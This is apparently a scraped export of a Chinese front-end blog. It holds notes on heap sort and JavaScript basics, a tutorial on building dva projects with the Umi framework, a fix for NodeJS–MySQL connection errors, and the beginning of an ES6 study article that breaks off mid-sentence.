堆排序把数组当中二叉树来排序而得名。1）索引0是树的根节点；2）除根节点为，任意节点N的父节点是N/2；3）节点L的左子节点是2L；4）节点R的右子节点为2R + 1本质上就是先构建二叉树，然后把根节点与最后一个进行交换，然后对剩下对元素进行二叉树构建，进行交换，直到剩下最后一个 5.Javascript常用知识点url: https://github.com/qianbin01/frontend_train#javascript知识点map,reduce,filter的用法js数据类型(7种) 1.number;2.string;3.boolean;4.undefined;5.null;6.symbol（ES6新增，文章后面有对着新类型的解释）Symbol 生成一个全局唯一的值。7.Object.（包括Object，Array，Function）闭包12345678function foo(x) &#123; var tmp = 3; return function (y) &#123; alert(x + y + (++tmp)); &#125;&#125;var bar = foo(2); // bar 现在是一个闭包bar(10); 结果是16es6通常用let const块级作用域代替，闭包缺点，ie中会引起内存泄漏，严格来说是ie的缺点不是闭包的问题 什么是立即执行函数？使用立即执行函数的目的是什么？1234567891011//常见两种方式1.(function()&#123;...&#125;)() (function(x)&#123; console.log(x); &#125;)(12345)2.(function()&#123;...&#125;()) (function(x)&#123; console.log(x); &#125;(12345))//作用 不破坏污染全局的命名空间，若需要使用，将其用变量传入如（function(window)&#123;...&#125;(window)） async/await 语法深浅拷贝数组去重思路1：定义一个新数组，并存放原数组的第一个元素，然后将元素组一一和新数组的元素对比，若不同则存放在新数组中思路2：先将原数组排序，在与相邻的进行比较，如果不同则存入新数组。思路3：利用对象属性存在的特性，如果没有该属性则存入新数组。思路4（最常用）：使用es6 set12let arr= [1, 2, 3, 3, 5, 7, 2, 6, 8];console.log([...new Set(arr)]); JS原型","categories":[{"name":"优质文章分享","slug":"优质文章分享","permalink":"https://ru23.com/categories/优质文章分享/"}],"tags":[{"name":"优质文章分享","slug":"优质文章分享","permalink":"https://ru23.com/tags/优质文章分享/"}]},{"title":"使用umi改进dva项目开发","slug":"2018-09-umi-dva","date":"2018-09-07T12:10:23.000Z","updated":"2018-10-24T03:46:02.635Z","comments":true,"path":"note/c9093d3b.html","link":"","permalink":"https://ru23.com/note/c9093d3b.html","excerpt":"","text":"一、Umi简介 一个可插拔的企业级 react 应用框架。umi 以路由为基础的，以及各种进阶的路由功能，并以此进行功能扩展，比如支持路由级的按需加载。然后配以完善的插件体系，覆盖从源码到构建产物的每个生命周期 1.1 特性 开箱即用，内置 react、react-router 等 支持配置的路由方式 完善的插件体系，覆盖从源码到构建产物的每个生命周期 高性能，通过插件支持 PWA、以路由为单元的 code splitting 等 支持静态页面导出，适配各种环境，比如中台业务、无线业务、egg、支付宝钱包、云凤蝶等 开发启动快，支持一键开启 dll 和 hard-source-webpack-plugin 等 一键兼容到 IE9，基于 umi-plugin-polyfills 完善的 TypeScript 支持，包括 d.ts定义和 umi test 与 dva 数据流的深入融合，支持 duck directory、model 的自动加载、code splitting等等 1.2 架构 1.3 和 dva、roadhog关系 roadhog 是基于 webpack 的封装工具，目的是简化 webpack 的配置umi 可以简单地理解为 roadhog + 路由，思路类似 next.js/nuxt.js，辅以一套插件机制，目的是通过框架的方式简化 React开发 dva 目前是纯粹的数据流，和 umi 以及 roadhog 之间并没有相互的依赖关系，可以分开使用也可以一起使用 二、环境搭建12$ mkdir myapp &amp;&amp; cd myapp$ yarn create umi 确定后，会根据你的选择自动创建好目录和文件 三、目录结构 dva 项目之前通常都是这种扁平的组织方式 1234567891011+ models - global.js - a1.js - a2.js - b.js+ services - a.js - b.js+ routes - PageA.js - PageB.js 用了 umi 后，可以按页面维度进行组织 12345678910111213+ models/global.js+ pages + a - index.js + models - a1.js - a2.js + services - a.js + b - index.js - model.js - service.js 好处是更加结构更加清晰了，减少耦合，一删全删，方便 copy 和共享 自动注册 models 123456789101112131415161718+ src + models - g.js + pages + a + models - a.js - b.js + ss - s.js - page.js + c - model.js + d + models - d.js - page.js - page.js global model 为 src/models/g.js /a 的 page model 为 src/pages/a/models/{a,b,ss/s}.js /c 的 page model 为 src/pages/c/model.js /c/d 的 page model 为 src/pages/c/model.js, src/pages/c/d/models/d.js 一个复杂应用的目录结构如下 1234567891011121314151617181920.├── dist/ // 默认的 build 输出目录├── mock/ // mock 文件所在目录，基于 express├── config/ ├── config.js // umi 配置，同 .umirc.js，二选一└── src/ // 源码目录，可选 ├── layouts/index.js // 全局布局 ├── pages/ // 页面目录，里面的文件即路由 ├── .umi/ // dev 临时目录，需添加到 .gitignore ├── .umi-production/ // build 临时目录，会自动删除 ├── document.ejs // HTML 模板 ├── 404.js // 404 页面 ├── page1.js // 页面 1，任意命名，导出 react 组件 ├── page1.test.js // 用例文件，umi test 会匹配所有 .test.js 和 .e2e.js 结尾的文件 └── page2.js // 页面 2，任意命名 ├── global.css // 约定的全局样式文件，自动引入，也可以用 global.less ├── global.js // 可以在这里加入 polyfill├── .umirc.js // umi 配置，同 config/config.js，二选一├── .env // 环境变量└── package.json 1、dist 默认输出路径，可通过配置 outputPath 修改 2、mock 约定 mock目录里所有的 .js 文件会被解析为 mock 文件 比如，新建mock/users.js，内容如下： 123export default &#123; '/api/users': ['a', 'b'],&#125; 然后在浏览器里访问 http://localhost:8000/api/users 就可以看到 [&#39;a&#39;, &#39;b&#39;] 了 3、src 约定 src 为源码目录，但是可选，简单项目可以不加 src 这层目录 比如：下面两种目录结构的效果是一致的。 123456+ src + pages - index.js + layouts - index.js- .umirc.js 12345+ pages - index.js+ layouts - index.js- .umirc.js 4、src/layouts/index.js 全局布局，实际上是在路由外面套了一层 比如，你的路由是： 1234[ &#123; path: '/', component: './pages/index' &#125;, &#123; path: '/users', component: './pages/users' &#125;,] 如果有 layouts/index.js，那么路由则变为： 1234567[ &#123; path: '/', component: './layouts/index', routes: [ &#123; path: '/', component: './pages/index' &#125;, &#123; path: '/users', component: './pages/users' &#125;, ] &#125;] 5、src/pages 约定 pages 下所有的 (j|t)sx? 文件即路由 6、src/pages/404.js 404 页面。注意开发模式下有内置 umi 提供的 404 提示页面，所以只有显式访问 /404 才能访问到这个页面 7、src/pages/document.ejs 有这个文件时，会覆盖默认的 HTML 模板。需至少包含以下代码， 1&lt;div id=\"root\"&gt;&lt;/div&gt; 8、src/pages/.umi 这是 umi dev 时生产的临时目录，默认包含 umi.js 和 router.js，有些插件也会在这里生成一些其他临时文件。可以在这里做一些验证，但请不要直接在这里修改代码，umi 重启或者 pages 下的文件修改都会重新生成这个文件夹下的文件 9、src/pages/.umi-production 同 src/pagers/.umi，但是是在 umi build时生成的，会在 umi build 执行完自动删除 10、src/global.(j|t)sx? 在入口文件最前面被自动引入，可以考虑在此加入 polyfill 11、src/global.(css|less|sass|scss) 这个文件不走 css modules，自动被引入，可以写一些全局样式，或者做一些样式覆盖 12、.umirc.js 和 config/config.js umi 的配置文件，二选一 13、.env 环境变量，比如： 12CLEAR_CONSOLE=noneBROWSER=none 四、路由配置4.1 约定式路由4.1.1 基础路由假设 pages 目录结构如下： 12345+ pages/ + users/ - index.js - list.js - index.js 那么，umi 会自动生成路由配置如下： 12345[ &#123; path: '/', component: './pages/index.js' &#125;, &#123; path: '/users/', component: './pages/users/index.js' &#125;, &#123; path: '/users/list', component: './pages/users/list.js' &#125;,] 4.1.2 动态路由 umi 里约定，带 $ 前缀的目录或文件为动态路由。 比如以下目录结构： 1234567+ pages/ + $post/ - index.js - comments.js + users/ $id.js - index.js 会生成路由配置如下： 123456[ &#123; path: '/', component: './pages/index.js' &#125;, &#123; path: '/users/:id', component: './pages/users/$id.js' &#125;, &#123; path: '/:post/', component: './pages/$post/index.js' &#125;, &#123; path: '/:post/comments', component: './pages/$post/comments.js' &#125;,] 4.1.3 可选的动态路由 umi 里约定动态路由如果带 $ 后缀，则为可选动态路由。 比如以下结构： 1234+ pages/ + users/ - $id$.js - index.js 会生成路由配置如下： 1234[ &#123; path: '/': component: './pages/index.js' &#125;, &#123; path: '/users/:id?': component: './pages/users/$id$.js' &#125;,] 4.1.4 嵌套路由 umi 里约定目录下有_layout.js 时会生成嵌套路由，以_layout.js 为该目录的 layout 。 比如以下目录结构： 12345+ pages/ + users/ - _layout.js - $id.js - index.js 会生成路由配置如下： 12345678[ &#123; path: '/users': component: './pages/users/_layout.js' routes: [ &#123; path: '/users/', component: './pages/users/index.js' &#125;, &#123; path: '/users/:id', component: './pages/users/$id.js' &#125;, ], &#125;,] 4.1.5 全局 layout 约定 src/layouts/index.js 为全局路由，返回一个 React 组件，通过 props.children 渲染子组件。 比如： 123456789export default function(props) &#123; return ( &lt;&gt; &lt;Header /&gt; &#123; props.children &#125; &lt;Footer /&gt; &lt;/&gt; );&#125; 4.1.6 不同的全局 layout 你可能需要针对不同路由输出不同的全局 layout，umi 不支持这样的配置，但你仍可以在 layouts/index.js 对 location.path 做区分，渲染不同的 layout。 比如想要针对 /login 输出简单布局， 12345678910111213export default function(props) &#123; if (props.location.pathname === '/login') &#123; return &lt;SimpleLayout&gt;&#123; props.children &#125;&lt;/SimpleLayout&gt; &#125; return ( &lt;&gt; &lt;Header /&gt; &#123; props.children &#125; &lt;Footer /&gt; &lt;/&gt; );&#125; 4.1.7 404 路由 约定 pages/404.js 为 404页面，需返回 React 组件。 比如： 12345export default () =&gt; &#123; return ( &lt;div&gt;I am a customized 404 page&lt;/div&gt; );&#125;; 注意：开发模式下，umi 会添加一个默认的 404 页面来辅助开发，但你仍然可通过精确地访问 /404来验证 404 页面。 4.1.8 通过注释扩展路由 约定路由文件的首个注释如果包含 yaml格式的配置，则会被用于扩展路由。 比如： 12+ pages/ - index.js 如果pages/index.js 里包含： 123456/** * title: Index Page * Routes: * - ./src/routes/a.js * - ./src/routes/b.js */ 则会生成路由配置： 123456[ &#123; path: '/', component: './index.js', title: 'Index Page', Routes: [ './src/routes/a.js', './src/routes/b.js' ], &#125;,] 4.2 配置式路由 如果你倾向于使用配置式的路由，可以配置 routes ，此配置项存在时则不会对 src/pages 目录做约定式的解析。 比如： 123456789101112export default &#123; routes: [ &#123; path: '/', component: './a' &#125;, &#123; path: '/list', component: './b', Routes: ['./routes/PrivateRoute.js'] &#125;, &#123; path: '/users', component: './users/_layout', routes: [ &#123; path: '/users/detail', component: './users/detail' &#125;, &#123; path: '/users/:id', component: './users/id' &#125; ] &#125;, ],&#125;; 注意：component 是相对于 src/pages 目录的 4.3 权限路由 umi 的权限路由是通过配置路由的 Routes 属性来实现。约定式的通过 yaml 注释添加，配置式的直接配上即可。 比如有以下配置： 1234[ &#123; path: '/', component: './pages/index.js' &#125;, &#123; path: '/list', component: './pages/list.js', Routes: ['./routes/PrivateRoute.js'] &#125;,] 然后 umi 会用./routes/PrivateRoute.js来渲染 /list。 ./routes/PrivateRoute.js 文件示例： 12345678export default (props) =&gt; &#123; return ( &lt;div&gt; &lt;div&gt;PrivateRoute (routes/PrivateRoute.js)&lt;/div&gt; &#123; props.children &#125; &lt;/div&gt; );&#125; 4.4 路由动效 路由动效应该是有多种实现方式，这里举 react-transition-group 的例子。 先安装依赖， 1$ yarn add react-transition-group 在 layout 组件（layouts/index.js 或者 pages 子目录下的 _layout.js）里在渲染子组件时用 TransitionGroup 和 CSSTransition 包裹一层，并以 location.key 为 key， 1234567891011import withRouter from 'umi/withRouter';import &#123; TransitionGroup, CSSTransition &#125; from \"react-transition-group\";export default withRouter( (&#123; location &#125;) =&gt; &lt;TransitionGroup&gt; &lt;CSSTransition key=&#123;location.key&#125; classNames=\"fade\" timeout=&#123;300&#125;&gt; &#123; children &#125; &lt;/CSSTransition&gt; &lt;/TransitionGroup&gt;) 上面用到的 fade 样式，可以在 src 下的 global.css 里定义： 123456789.fade-enter &#123; opacity: 0; z-index: 1;&#125;.fade-enter.fade-enter-active &#123; opacity: 1; transition: opacity 250ms ease-in;&#125; 4.5 面包屑 面包屑也是有多种实现方式，这里举 react-router-breadcrumbs-hoc 的例子。 先安装依赖， 1$ yarn add react-router-breadcrumbs-hoc 然后实现一个 Breakcrumbs.js，比如： 123456789101112131415161718192021import NavLink from 'umi/navlink';import withBreadcrumbs from 'react-router-breadcrumbs-hoc';// 更多配置请移步 https://github.com/icd2k3/react-router-breadcrumbs-hocconst routes = [ &#123; path: '/', breadcrumb: '首页' &#125;, &#123; path: '/list', breadcrumb: 'List Page' &#125;,];export default withBreadcrumbs(routes)((&#123; breadcrumbs &#125;) =&gt; ( &lt;div&gt; &#123;breadcrumbs.map((breadcrumb, index) =&gt; ( &lt;span key=&#123;breadcrumb.key&#125;&gt; &lt;NavLink to=&#123;breadcrumb.props.match.url&#125;&gt; &#123;breadcrumb&#125; &lt;/NavLink&gt; &#123;(index &lt; breadcrumbs.length - 1) &amp;&amp; &lt;i&gt; / &lt;/i&gt;&#125; &lt;/span&gt; ))&#125; &lt;/div&gt;)); 然后在需要的地方引入此 React 组件即可。 4.6 启用 Hash 路由 umi 默认是用的 Browser History，如果要用 Hash History，需配置： 123456789101112131415161718192021export default &#123; history: 'hash',&#125;# Scroll to top在 layout 组件（layouts/index.js 或者 pages 子目录下的 _layout.js）的 componentDidUpdate 里决定是否 scroll to top，比如：import &#123; Component &#125; from 'react';import withRouter from 'umi/withRouter';class Layout extends Component &#123; componentDidUpdate(prevProps) &#123; if (this.props.location !== prevProps.location) &#123; window.scrollTo(0, 0); &#125; &#125; render() &#123; return this.props.children; &#125;&#125;export default withRouter(Layout); 4.7 页面间跳转 在 umi 里，页面之间跳转有两种方式：声明式和命令式 声明式 基于 umi/link，通常作为 React 组件使用。 12345import Link from 'umi/link';export default () =&gt; ( &lt;Link to=\"/list\"&gt;Go to list page&lt;/Link&gt;); 命令式 基于 umi/router，通常在事件处理中被调用。 12345import router from 'umi/router';function goToListPage() &#123; router.push('/list');&#125; 五、配置 配置文件umi 允许在 .umirc.js 或 config/config.js（二选一，.umirc.js 优先）中进行配置，支持 ES6语法。 比如： 123456789export default &#123; base: '/admin/', publicPath: 'http://cdn.com/foo', plugins: [ ['umi-plugin-react', &#123; dva: true, &#125;], ],&#125;; .umirc.local.js .umirc.local.js 是本地的配置文件，不要提交到 git，所以通常需要配置到 .gitignore。如果存在，会和 .umirc.js 合并后再返回。 UMI_ENV 可以通过环境变量 UMI_ENV 区分不同环境来指定配置。 举个例子， 12345678// .umirc.jsexport default &#123; a: 1, b: 2 &#125;;// .umirc.cloud.jsexport default &#123; b: 'cloud', c: 'cloud' &#125;;// .umirc.local.jsexport default &#123; c: 'local' &#125;; 不指定 UMI_ENV 时，拿到的配置是： 12345&#123; a: 1, b: 2, c: 'local',&#125; 指定 UMI_ENV=cloud时，拿到的配置是： 12345&#123; a: 1, b: 'cloud', c: 'local',&#125; 六、Mock 数据使用 umi 的 mock 功能 umi 里约定 mock 文件夹下的文件即mock文件，文件导出接口定义，支持基于 require 动态分析的实时刷新，支持 ES6 语法，以及友好的出错提示 12345678910export default &#123; // 支持值为 Object 和 Array 'GET /api/users': &#123; users: [1, 2] &#125;, // GET POST 可省略 '/api/users/1': &#123; id: 1 &#125;, // 支持自定义函数，API 参考 express@4 'POST /api/users/create': (req, res) =&gt; &#123; res.end('OK'); &#125;,&#125;; 当客户端（浏览器）发送请求，如：GET /api/users，那么本地启动的 umi dev 会跟此配置文件匹配请求路径以及方法，如果匹配到了，就会将请求通过配置处理 引入 Mock.js Mock.js 是常用的辅助生成模拟数据的第三方库，当然你可以用你喜欢的任意库来结合 roadhog 构建数据模拟功能 12345678import mockjs from 'mockjs';export default &#123; // 使用 mockjs 等三方库 'GET /api/tags': mockjs.mock(&#123; 'list|100': [&#123; name: '@city', 'value|1-100': 50, 'type|0-2': 1 &#125;], &#125;),&#125;; 添加跨域请求头 设置 response 的请求头即可： 12345'POST /api/users/create': (req, res) =&gt; &#123; ... res.setHeader('Access-Control-Allow-Origin', '*'); ...&#125;, 合理的拆分你的 mock 文件 对于整个系统来说，请求接口是复杂并且繁多的，为了处理大量模拟请求的场景，我们通常把每一个数据模型抽象成一个文件，统一放在 mock 的文件夹中，然后他们会自动被引入 模拟延迟 为了更加真实的模拟网络数据请求，往往需要模拟网络延迟时间 手动添加 setTimeout 模拟延迟 你可以在重写请求的代理方法，在其中添加模拟延迟的处理，如： 12345'POST /api/forms': (req, res) =&gt; &#123; setTimeout(() =&gt; &#123; res.send('Ok'); &#125;, 1000);&#125;, 使用插件模拟延迟 上面的方法虽然简便，但是当你需要添加所有的请求延迟的时候，可能就麻烦了，不过可以通过第三方插件来简化这个问题，如：roadhog-api-doc#delay。 123456789101112131415161718192021import &#123; delay &#125; from 'roadhog-api-doc';const proxy = &#123; 'GET /api/project/notice': getNotice, 'GET /api/activities': getActivities, 'GET /api/rule': getRule, 'GET /api/tags': mockjs.mock(&#123; 'list|100': [&#123; name: '@city', 'value|1-100': 50, 'type|0-2': 1 &#125;] &#125;), 'GET /api/fake_list': getFakeList, 'GET /api/fake_chart_data': getFakeChartData, 'GET /api/profile/basic': getProfileBasicData, 'GET /api/profile/advanced': getProfileAdvancedData, 'POST /api/register': (req, res) =&gt; &#123; res.send(&#123; status: 'ok' &#125;); &#125;, 'GET /api/notices': getNotices,&#125;;// 调用 delay 函数，统一处理export default delay(proxy, 1000); 联调 当本地开发完毕之后，如果服务器的接口满足之前的约定，那么你只需要不开本地代理或者重定向代理到目标服务器就可以访问真实的服务端数据，非常方便 七、结合dva实践 自&gt;= umi@2起，dva的整合可以直接通过 umi-plugin-react 来配置 特性 按目录约定注册 model，无需手动 app.model 文件名即namespace，可以省去 model 导出的 namespace key 无需手写 router.js，交给 umi 处理，支持 model 和 component 的按需加载 内置 query-string 处理，无需再手动解码和编码 内置 dva-loading和 dva-immer，其中 dva-immer 需通过配置开启 开箱即用，无需安装额外依赖，比如 dva、dva-loading、dva-immer、path-to-regexp、object-assign、react、react-dom 等` 使用 1$ yarn add umi-plugin-react 然后在 .umirc.js 里配置插件： 1234567export default &#123; plugins: [ [ 'umi-plugin-react', ] ],&#125;; 推荐开启 dva-immer 以简化 reducer 编写， 123456789101112export default &#123; plugins: [ [ 'umi-plugin-react', &#123; dva: &#123; immer: true &#125; &#125; ], ],&#125;; model 注册 model 分两类，一是全局model，二是页面model。全局 model存于 /src/models/ 目录，所有页面都可引用；页面 model 不能被其他页面所引用。 规则如下： src/models/**/*.js 为 global model src/pages/**/models/**/*.js为 page model global model 全量载入，page model 在 production时按需载入，在 development 时全量载入 page model 为 page js 所在路径下 models/**/*.js 的文件 page model 会向上查找，比如 page js 为 pages/a/b.js，他的 page model 为 pages/a/b/models/**/*.js +pages/a/models/**/*.js，依次类推 约定 model.js 为单文件 model，解决只有一个model 时不需要建 models 目录的问题，有 model.js则不去找 models/**/*.js 123456789101112131415161718+ src + models - g.js + pages + a + models - a.js - b.js + ss - s.js - page.js + c - model.js + d + models - d.js - page.js - page.js 如上目录： global model 为 src/models/g.js /a 的 page model为 src/pages/a/models/{a,b,ss/s}.js /c的 page model 为 src/pages/c/model.js` /c/d 的 page model 为 src/pages/c/model.js, src/pages/c/d/models/d.js 八、问题汇总1、如何配置 onError、initialState 等 hook？ 新建 src/dva.js，通过导出的 config 方法来返回额外配置项，比如： 123456789101112131415import &#123; message &#125; from 'antd';export function config() &#123; return &#123; onError(err) &#123; err.preventDefault(); message.error(err.message); &#125;, initialState: &#123; global: &#123; text: 'hi umi + dva', &#125;, &#125;, &#125;;&#125; 2、url 变化了，但页面组件也刷新，是什么原因？ layouts/index.js 里如果用了 connect 传数据，需要用 umi/withRouter 高阶一下 123import withRouter from 'umi/withRouter';export default withRouter(connect(mapStateToProps)(LayoutComponent)); 3、如何访问到 store 或 dispatch 方法？ 12window.g_app._storewindow.g_app._store.dispatch 4、如何禁用包括 component 和 models 的按需加载？ 在 .umirc.js 里配置： 123export default &#123; disableDynamicImport: true,&#125;; 如果不用page.js的命名，倒是能生成路由，但是model、service、components就全部变路由了 不用 page.js，然后通过 umi-plugin-routes 过滤掉不需要的路由，参考 https://github.com/zuiidea/antd-admin/blob/develop/.umirc.js#L4-L16 .umirc.mock.js 这个文件怎么配置呢？ 可以不用配置，在 mock/ 下建文件写 mock 代码即可。 九、Demo https://github.com/poetries/umi-tmp 十、参考 Umi config配置 Umi APi Umi插件 使用 umi 改进 dva 项目开发","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Dva","slug":"Dva","permalink":"https://ru23.com/tags/Dva/"},{"name":"Umi","slug":"Umi","permalink":"https://ru23.com/tags/Umi/"}]},{"title":"NodeJS连接MySQL时遇到的问题 Error Connection lost The server closed the connection.","slug":"2018-09-NodeJS连接MySQL时遇到的问题-Error-Connection-lost-The-server-closed-the-connection","date":"2018-09-07T07:54:30.000Z","updated":"2018-10-24T03:46:02.619Z","comments":true,"path":"note/500f0fbd.html","link":"","permalink":"https://ru23.com/note/500f0fbd.html","excerpt":"","text":"今天用NodeJS连接Mysql时遇到点折磨人的问题，记录下解决方法。 NodeJS和Mysql都已经正确安装了，但是NodeJS和Mysql的连接出现问题，查找网上一些解决办法都不能解决问题。报错如下： image 经过查找定位，在mysql官网找到了解决方案： 官网链接 》》MySQL Connector/Node.jsMySql 针对node的连接器对mysql的版本有要求，且需要另外的插件： image 然后下载的最新版的mysql mysql-installer-community-5.7.20.0.msi 执行 :123npm install mysqlnpm install @mysql/xdevapi 运行官方示例，成功。","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"node","slug":"node","permalink":"https://ru23.com/tags/node/"}]},{"title":"ES6学习笔记","slug":"2018-09-小邵教你玩转es6","date":"2018-09-07T02:57:11.000Z","updated":"2018-10-24T03:46:03.329Z","comments":true,"path":"note/a5a8a12c.html","link":"","permalink":"https://ru23.com/note/a5a8a12c.html","excerpt":"","text":"前言：大家好，我叫邵威儒，大家都喜欢喊我小邵，学的金融专业却凭借兴趣爱好入了程序猿的坑，从大学买的第一本vb和自学vb，我就与编程结下不解之缘，随后自学易语言写游戏辅助、交易软件，至今进入了前端领域，看到不少朋友都写文章分享，自己也弄一个玩玩，以下文章纯属个人理解，便于记录学习，肯定有理解错误或理解不到位的地方，意在站在前辈的肩膀，分享个人对技术的通俗理解，共同成长！ 后续我会陆陆续续更新Javascript方面，尽量把Javascript这个学习路径体系都写一下包括前端所常用的es6、angular、react、vue、nodejs、koa、express、公众号等等都会从浅到深，从入门开始逐步写，希望能让大家有所收获，也希望大家关注我~ 文章列表：https://juejin.im/user/5a84f871f265da4e82634f2d/posts Author: 邵威儒Email: 166661688@qq.comWechat: 166661688github: https://github.com/iamswr/ 接下来我主要给大家讲下我对常用的es6的理解，我们工作当中，其实有很多用不上的，如果想详细了解的话可以看看阮一峰老师的es6：http://es6.ruanyifeng.com/ 这篇文章主要让你学会工作当中常用的es6技巧，以及扩展如实现数据双向绑定，class用es5如何实现、如何给伪数组添加迭代器等等。 var、let、const1234567891011121314151617181920212223242526272829303132333435// 1.var存在变量作用域的提升console.log(a) // 打印输出 undefinedvar a = 1// 怎么理解作用域的提升呢？// var str = &apos;hello swr&apos;// function()&#123;// console.log(str) // 打印输出 undefined// var str = &apos;goodbye swr&apos;// &#125;// test()// 上面这段代码实际上是var str = &apos;hello swr&apos;function()&#123; var str console.log(str) // 打印输出undefined // 实际上就是var声明的变量，拿到 // 当前作用域的最顶层，而此时尚未赋值 // 只是声明，所以打印出undefined，而非当运行 // 到这段代码时才声明，优先声明， // 当运行到那行的时候，实际上是赋值 // 同样的，function xx()&#123;&#125;也存在作用域提升 str = &apos;goodbye swr&apos;&#125;test()// var 不存在块级作用域的概念// 我的理解是在es6之前，是没有块级作用域的概念，// 变量只有遇到函数的时候才会变为局部变量&#123; var str 1 = &apos;hello swr&apos;&#125;console.log(str1) // 打印输出 hello swr 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152// 2.let// 2.1 不存在变量作用域提升，这样可以避免了我们还没声明变量就拿变量来用// 2.2 同一作用域的同一个变量不能够重复声明，避免我们重复声明变量// 2.3 let声明的变量不会到全局上// 2.4 let和代码块&#123;&#125;结合使用会形成块级作用域// 2.1// console.log(a) // 报错，a未声明// let a = &apos;hello swr&apos;// 2.2// let a = &apos;hello swr&apos;// let a = &apos;hello swr&apos; // 报错，变量被重复声明// 2.3// let a = &apos;hello swr&apos;// console.log(window.a) // undefined// 2.4// 在代码块以外调用str2，会报错&#123; let str2 = &apos;hello swr&apos;&#125;console.log(str2) // 报错，未找到变量// 上面这种写法，也有点类型es6之前的立即执行函数(function()&#123; var str2 = &apos;hello swr&apos;&#125;)()// 一个例子// 使用var，会发现最终console.log中打印的i都是3// 因为for循环不是函数，而此时var i是处于全局当中// for循环是同步代码，所以会执行完同步代码后// 再执行setTimeout的异步代码，此时i已为3，所以打印出来都是3for(var i = 0;i &lt; 3;i++)&#123; setTimeout(function()&#123; console.log(i) &#125;,1000)&#125;// 那么我们用let试下// let和代码块结合起来使用会形成块级作用域// 那么当for时，这3个setTimeout会分别在3个不同的块级作用域// 当执行setTimeout的console.log(i)时，会先寻找最近的块级作用域中的i// 所以会依次打印出0 1 2for(let j = 0;j &lt; 3;j++)&#123; setTimeout(function()&#123; console.log(i) &#125;,1000)&#125; 1234567891011121314151617// 3.const// 3.1 const和let基本上可以说是完全一致的，但是const声明的对象不能更改其指向的引用地址（即堆区）// 3.1// 当用普通值赋值给const声明的变量后，再重新赋值时// 值引用会被更改，所以会报错const STR1 = &apos;hello swr&apos;STR1 = &apos;goodbye swr&apos; // 报错,Assignment to constant variable// 当我们修改这个引用地址里面的内容时，则不会报错// 因为这个变量是指向这个引用地址的const OBJ = &#123;name:&quot;swr&quot;&#125;OBJ.name = &apos;hello swr&apos;console.log(OBJ) // &#123;name:&quot;hello swr&quot;&#125;// 但是当我们把这个变量重新赋值一个引用地址时，则会报错OBJ = &#123;&#125; // 报错 解构赋值解构赋值主要分为对象的解构和数组的解构，在没有解构赋值的时候，我们赋值是这样的1234let arr = [0,1,2]let a = arr[0]let b = arr[1]let c = arr[2] 这样写很繁琐，那么我们有没办法既声明，又赋值，更优雅的写法呢？肯定是有的，那就是解构赋值，解构赋值，简单理解就是等号的左边和右边相等。 数组的解构赋值12345let arr = [0,1,2]let [a,b,c] = arrconsole.log(a) // 0console.log(b) // 1console.log(c) // 2 但是很多时候，数据并非一一对应的，并且我们希望得到一个默认值1234567let arr = [,1,2]let [a=&apos;我是默认值&apos;,b,c] = arrconsole.log(a) // &apos;我是默认值&apos;console.log(b) // 1console.log(c) // 2// 从这个例子可以看出，在解构赋值的过程中，a=undefined时，会使用默认值// 那么当a=null时呢？当a=null时，那么a就不会使用默认值，而是使用null 12345678// 数组的拼接let a = [0,1,2]let b = [3,4,5]let c = a.concat(b)console.log(c) // [0,1,2,3,4,5]let d = [...a,...b]console.log(d) // [0,1,2,3,4,5] 12345678910111213141516// 数组的克隆// 假如我们简单地把一个数组赋值给另外一个变量let a = [0,1,2,3]let b = ab.push(4)console.log(a) // [0,1,2,3,4]console.log(b) // [0,1,2,3,4]// 因为这只是简单的把引用地址赋值给b，而不是重新开辟一个内存地址，所以// a和b共享了同一个内存地址，该内存地址的更改，会影响到所有引用该地址的变量// 那么用下面的方法，把数组进行克隆一份，互不影响let a = [0,1,2,3]let b = [...a]b.push(4)console.log(a) // [0,1,2,3]console.log(b) // [0,1,2,3,4] 对象的解构赋值对象的解构赋值和数组的解构赋值其实类似，但是数组的数组成员是有序的而对象的属性则是无序的，所以对象的解构赋值简单理解是等号的左边和右边的结构相同123let &#123;name,age&#125; = &#123;name:&quot;swr&quot;,age:28&#125;console.log(name) // &apos;swr&apos;console.log(age) // 28 对象的解构赋值是根据key值进行匹配12345// 这里可以看出，左侧的name和右侧的name，是互相匹配的key值// 而左侧的name匹配完成后，再赋值给真正需要赋值的Namelet &#123; name:Name,age &#125; = &#123; name:&apos;swr&apos;,age:28 &#125;console.log(Name) // &apos;swr&apos;console.log(age) // 28 那么当变量已经被声明了呢？12345let name,age// 需要用圆括号，包裹起来(&#123;name,age&#125; = &#123;name:&quot;swr&quot;,age:28&#125;)console.log(name) // &apos;swr&apos;console.log(age) // 28 变量能否也设置默认值？1234let &#123;name=&quot;swr&quot;,age&#125; = &#123;age:28&#125;console.log(name) // &apos;swr&apos;console.log(age) // 28// 这里规则和数组的解构赋值一样，当name = undefined时，则会使用默认值 12345let [a] = [&#123;name:&quot;swr&quot;,age:28&#125;]console.log(a) // &#123;name:&quot;swr&quot;,age:28&#125;let &#123; length &#125; = &quot;hello swr&quot;console.log(length) // 9 1234567function ajax(&#123;method,url,type=&apos;params&apos;&#125;)&#123; console.log(method) // &apos;get&apos; console.log(url) // &apos;/&apos; console.log(type) // &apos;params&apos;&#125;ajax(&#123;method:&quot;get&quot;,url:&quot;/&quot;&#125;) 扩展运算符我们先看下代码12345678910111213// 在以往，我们给函数传不确定参数数量时，是通过arguments来获取的function sum() &#123; console.log(arguments) // &#123; &apos;0&apos;: 1, &apos;1&apos;: 2, &apos;2&apos;: 3, &apos;3&apos;: 4, &apos;4&apos;: 5, &apos;5&apos;: 6 &#125; // 我们可以看出，arguments不是一个数组，而是一个伪数组 let total = 0 let &#123; length &#125; = arguments for(let i = 0;i &lt; length;i++)&#123; total += arguments[i] &#125; return total&#125;console.log(sum(1,2,3,4,5,6)) // 21 1234567// 接下来我们用扩展运算符看看function sum(...args)&#123; // 使用...扩展运算符 console.log(args) // [ 1, 2, 3, 4, 5, 6 ] args是一个数组 return eval(args.join(&apos;+&apos;))&#125;console.log(sum(1,2,3,4,5,6)) // 21 得到的args是一个数组，直接对数组进行操作会比对伪数组进行操作更加方便，还有一些注意点需要注意123456789101112131415// 正确的写法 扩展运算符只能放在最后一个参数function sum(a,b,...args)&#123; console.log(a) // 1 console.log(b) // 2 console.log(args) // [ 3, 4, 5, 6 ]&#125;sum(1,2,3,4,5,6)// 错误的写法 扩展运算符只能放在最后一个参数function 